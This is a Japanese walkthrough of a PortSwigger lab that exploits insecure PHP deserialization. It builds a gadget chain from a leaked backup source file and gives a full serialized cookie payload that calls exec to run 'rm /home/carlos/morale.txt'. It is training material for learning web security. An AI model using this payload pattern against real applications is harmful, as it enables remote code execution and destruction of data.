# PHP 逆シリアル化用のカスタム ガジェット チェーンの開発

以下のハッキングラボを実施します  
https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization  
このラボでは、シリアル化ベースのセッション メカニズムを使用します。カスタム ガジェット チェーンをデプロイすると、その安全でない逆シリアル化を悪用してリモート コード実行を実現できます。ラボを解決するには、morale.txtCarlos のホーム ディレクトリからファイルを削除します。

- 1. Burp Suite を起動して、Proxy タブからブラウザを起動します
- 2. ブラウザからハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. ログイン後の GET /my-account リクエストを send to repeater します
- 5. クッキーを inspector で見ると base64 でエンコーディングされている PHP オブジェクトであることが分かります

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"zvr3l2cfhmo0l2hghpuauezslcuj5lu5";}
```

- 6. リクエストのレスポンスに以下のコメントが残っています

```
<!-- TODO: Refactor once /cgi-bin/libs/CustomTemplate.php is updated -->
```

- 7. GET /cgi-bin/libs/CustomTemplate.php HTTP/2 を送信すると、ファイルの中身はないようです
- 8. vi で作成されるバックアップファイルにアクセスすると中身が見れます。GET /cgi-bin/libs/CustomTemplate.php~ HTTP/2

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

- 9. PHP は分からないが、ファイルの中にはコンストラクタで callback 関数を受け取る DefaultMap クラスがあるので実行コマンドを渡す。  
     Product クラスの desc フィールドに実行引数を入れてやれば、Product のコンストラクタが呼ばれたタイミングで exec OS コマンドが実行できる

```php
CustomTemplate->default_desc_type = "rm /home/carlos/morale.txt";
CustomTemplate->desc = DefaultMap;
DefaultMap->callback = "exec"
```

- 10. 上記コードを PHP オブジェクトでシリアル化する

```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}
```

- 11. これを Base64 および URL エンコーディングしてクッキーにセットするとユーザーが削除される
